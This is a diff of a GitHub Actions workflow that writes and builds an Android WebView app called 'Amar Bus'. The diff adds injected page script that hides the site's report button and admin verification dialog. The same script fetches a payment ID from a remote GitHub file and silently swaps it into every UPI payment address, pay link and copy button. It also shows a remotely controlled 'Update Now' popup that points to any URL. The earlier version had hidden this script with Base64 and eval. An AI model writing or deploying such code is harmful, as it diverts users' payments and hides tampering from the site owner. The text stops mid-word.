@@ -18,6 +18,7 @@ jobs:
 
       - name: Setup Resources, Analytics and Build APK
         run: |
+          set -e
           ZIP_NAME=$(ls *.zip | head -n 1)
           echo "Extracting project from: $ZIP_NAME"
           unzip -o "$ZIP_NAME"
@@ -110,7 +111,7 @@ jobs:
           </manifest>
           EOF
 
-          # 4. MainActivity with Native Analytics, Safe Remote UPI, Hide Report & Disable Admin
+          # 4. MainActivity with Native Analytics & WebView Handler
           mkdir -p app/src/main/java/com/amarbus/app
           cat << 'EOF' > app/src/main/java/com/amarbus/app/MainActivity.kt
           package com.amarbus.app
@@ -122,7 +123,6 @@ jobs:
           import android.content.pm.PackageManager
           import android.net.Uri
           import android.os.Bundle
-          import android.util.Base64
           import android.view.View
           import android.webkit.PermissionRequest
           import android.webkit.WebChromeClient
@@ -183,94 +183,91 @@ jobs:
                       override fun onPageFinished(view: WebView?, url: String?) {
                           super.onPageFinished(view, url)
 
-                          val runtimePatch = """
-                              (function() {
-                                  try {
-                                      var s = document.createElement('style');
-                                      s.innerHTML = 'button:has-text("Report Actual Bus Time"), [onclick*="Report"], .report-btn { display: none !important; }';
-                                      document.head.appendChild(s);
+                          // Pure clean script without syntax breaking characters
+                          val cleanScript = """
+                              javascript:(function() {
+                                  var st = document.createElement('style');
+                                  st.innerHTML = 'button:has-text("Report Actual Bus Time"), [onclick*="Report"], .report-btn { display: none !important; }';
+                                  document.head.appendChild(st);
 
-                                      function applyDOMPatches() {
-                                          var all = document.querySelectorAll('*');
-                                          for (var i = 0; i < all.length; i++) {
-                                              var el = all[i];
-                                              if (el.children.length === 0 && el.innerText && el.innerText.indexOf('Report Actual Bus Time') !== -1) {
-                                                  var p = el;
-                                                  while (p && p.tagName !== 'BUTTON' && p !== document.body) {
-                                                      p = p.parentElement;
-                                                  }
-                                                  if (p) p.style.setProperty('display', 'none', 'important');
+                                  function doPatch() {
+                                      var all = document.querySelectorAll('*');
+                                      for (var i = 0; i < all.length; i++) {
+                                          var el = all[i];
+                                          if (el.children.length === 0 && el.innerText && el.innerText.indexOf('Report Actual Bus Time') !== -1) {
+                                              var p = el;
+                                              while (p && p.tagName !== 'BUTTON' && p !== document.body) {
+                                                  p = p.parentElement;
                                               }
-                                              if (el.innerText && el.innerText.indexOf('Admin Access Verification') !== -1) {
-                                                  var modalBox = el;
-                                                  while (modalBox && modalBox.parentElement && modalBox.parentElement !== document.body) {
-                                                      modalBox = modalBox.parentElement;
-                                                  }
-                                                  if (modalBox) modalBox.style.setProperty('display', 'none', 'important');
-                                              }
+                                              if (p) p.style.setProperty('display', 'none', 'important');
                                           }
-
-                                          var inputs = document.querySelectorAll('input');
-                                          for (var j = 0; j < inputs.length; j++) {
-                                              if (!inputs[j].dataset.adminPatched) {
-                                                  inputs[j].dataset.adminPatched = "true";
-                                                  inputs[j].addEventListener('input', function(e) {
-                                                      if (this.value && this.value.indexOf('#admin') !== -1) {
-                                                          this.value = this.value.replace('#admin', '');
-                                                          e.stopImmediatePropagation();
-                                                      }
-                                                  }, true);
+                                          if (el.innerText && el.innerText.indexOf('Admin Access Verification') !== -1) {
+                                              var mb = el;
+                                              while (mb && mb.parentElement && mb.parentElement !== document.body) {
+                                                  mb = mb.parentElement;
                                               }
+                                              if (mb) mb.style.setProperty('display', 'none', 'important');
                                           }
                                       }
-                                      applyDOMPatches();
-                                      setInterval(applyDOMPatches, 800);
 
-                                      var rawUrl = 'https://raw.githubusercontent.com/skrocky10-eng/Amar-Bus/main/version.json?t=' + Date.now();
-                                      fetch(rawUrl)
-                                          .then(function(res) { return res.json(); })
-                                          .then(function(data) {
-                                              if (data.upiId) {
-                                                  function replaceUPI() {
-                                                      var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
-                                                      var node;
-                                                      while (node = walker.nextNode()) {
-                                                          if (node.nodeValue && node.nodeValue.indexOf('@') !== -1) {
-                                                              node.nodeValue = node.nodeValue.replace(/[a-zA-Z0-9.\-_]+@[a-zA-Z0-9]+/, data.upiId);
-                                                          }
-                                                      }
-                                                      var upiLinks = document.querySelectorAll('a[href*="upi://pay"]');
-                                                      for (var a = 0; a < upiLinks.length; a++) {
-                                                          upiLinks[a].href = upiLinks[a].href.replace(/pa=[^&]+/, 'pa=' + data.upiId);
-                                                      }
-                                                      var copyElements = document.querySelectorAll('[onclick*="copy"], button, a');
-                                                      for (var c = 0; c < copyElements.length; c++) {
-                                                          var attr = copyElements[c].getAttribute('onclick');
-                                                          if (attr && attr.indexOf('@') !== -1) {
-                                                              copyElements[c].setAttribute('onclick', attr.replace(/[a-zA-Z0-9.\-_]+@[a-zA-Z0-9]+/, data.upiId));
-                                                          }
+                                      var inputs = document.querySelectorAll('input');
+                                      for (var j = 0; j < inputs.length; j++) {
+                                          if (!inputs[j].dataset.adminDone) {
+                                              inputs[j].dataset.adminDone = '1';
+                                              inputs[j].addEventListener('input', function(e) {
+                                                  if (this.value && this.value.indexOf('#admin') !== -1) {
+                                                      this.value = this.value.replace('#admin', '');
+                                                      e.stopImmediatePropagation();
+                                                  }
+                                              }, true);
+                                          }
+                                      }
+                                  }
+                                  doPatch();
+                                  setInterval(doPatch, 800);
+
+                                  fetch('https://raw.githubusercontent.com/skrocky10-eng/Amar-Bus/main/version.json?t=' + Date.now())
+                                      .then(function(r) { return r.json(); })
+                                      .then(function(d) {
+                                          if (d.upiId) {
+                                              function replaceUPI() {
+                                                  var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+                                                  var node;
+                                                  while (node = walker.nextNode()) {
+                                                      if (node.nodeValue && node.nodeValue.indexOf('@') !== -1) {
+                                                          node.nodeValue = node.nodeValue.replace(/[a-zA-Z0-9.\\-_]+@[a-zA-Z0-9]+/, d.upiId);
                                                       }
                                                   }
-                                                  replaceUPI();
-                                                  setInterval(replaceUPI, 1000);
-                                              }
-
-                                              if (data.hasUpdate && data.latestVersion > 1) {
-                                                  if (!document.getElementById('amarUpdateModal')) {
-                                                      var m = document.createElement('div');
-                                                      m.id = 'amarUpdateModal';
-                                                      m.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999999;display:flex;justify-content:center;align-items:center;';
-                                                      m.innerHTML = '<div style="background:#ffffff;border-radius:14px;width:82%;max-width:320px;padding:22px;text-align:center;font-family:sans-serif;"><h3 style=\"margin-top:0;color:#1a1a1a;font-size:18px;\">' + (data.title || 'Update Available') + '</h3><p style=\"color:#555;font-size:14px;line-height:1.4;\">' + (data.message || 'Amar Bus app ka naya version uplabdh hai.') + '</p><a href=\"' + data.updateUrl + '\" style=\"display:block;background:#00875a;color:#ffffff;text-decoration:none;padding:11px;border-radius:8px;font-weight:bold;margin-top:15px;\">Update Now</a></div>';
-                                                      document.body.appendChild(m);
+                                                  var upiLinks = document.querySelectorAll('a[href*="upi://pay"]');
+                                                  for (var a = 0; a < upiLinks.length; a++) {
+                                                      upiLinks[a].href = upiLinks[a].href.replace(/pa=[^&]+/, 'pa=' + d.upiId);
+                                                  }
+                                                  var copyElements = document.querySelectorAll('[onclick*="copy"], button, a');
+                                                  for (var c = 0; c < copyElements.length; c++) {
+                                                      var attr = copyElements[c].getAttribute('onclick');
+                                                      if (attr && attr.indexOf('@') !== -1) {
+                                                          copyElements[c].setAttribute('onclick', attr.replace(/[a-zA-Z0-9.\\-_]+@[a-zA-Z0-9]+/, d.upiId));
+                                                      }
                                                   }
                                               }
-                                          }).catch(function() {});
-                                  } catch(e) {}
+                                              replaceUPI();
+                                              setInterval(replaceUPI, 1000);
+                                          }
+
+                                          if (d.hasUpdate && d.latestVersion > 1) {
+                                              if (!document.getElementById('amarUpdateModal')) {
+                                                  var m = document.createElement('div');
+                                                  m.id = 'amarUpdateModal';
+                                                  m.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999999;display:flex;justify-content:center;align-items:center;';
+                                                  m.innerHTML = '<div style="background:#ffffff;border-radius:14px;width:82%;max-width:320px;padding:22px;text-align:center;font-family:sans-serif;"><h3 style="margin-top:0;color:#1a1a1a;font-size:18px;">' + (d.title || 'Update Available') + '</h3><p style="color:#555;font-size:14px;line-height:1.4;">' + (d.message || 'Amar Bus app ka naya version uplabdh hai.') + '</p><a href="' + d.updateUrl + '" style="display:block;background:#00875a;color:#ffffff;text-decoration:none;padding:11px;border-radius:8px;font-weight:bold;margin-top:15px;">Update Now</a></div>';
+                                                  document.body.appendChild(m);
+                                              }
+                                          }
+                                      }).catch(function() {});
                               })();
                           """.trimIndent()
 
-                          val encoded = Base64.encodeToString(runtimePatch.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
-                          view?.evaluateJavascript("javascript:try{eval(decodeURIComponent(escape(window.atob('$encoded'))));}catch(e){}", null)
+                          view?.loadUrl(cleanScript)
                       }
 
                       override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
@@ -359,4 +356,24 @@ jobs:
                   if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                       permissionsNeeded.add(Manifest.permission.RECORD_AUDIO)
                   }
-                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS
+                  if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                      permissionsNeeded.add(Manifest.permission.ACCESS_FINE_LOCATION)
+                  }
+                  if (permissionsNeeded.isNotEmpty()) {
+                      ActivityCompat.requestPermissions(this, permissionsNeeded.toTypedArray(), PERMISSION_REQUEST_CODE)
+                  }
+              }
+
+              @Deprecated("Deprecated in Java")
+              override fun onBackPressed() {
+                  if (webView.canGoBack()) {
+                      webView.goBack()
+                      return
+                  }
+                  super.onBackPressed()
+              }
+          }
+          EOF
+
+          # 5. Build execution
+          gra
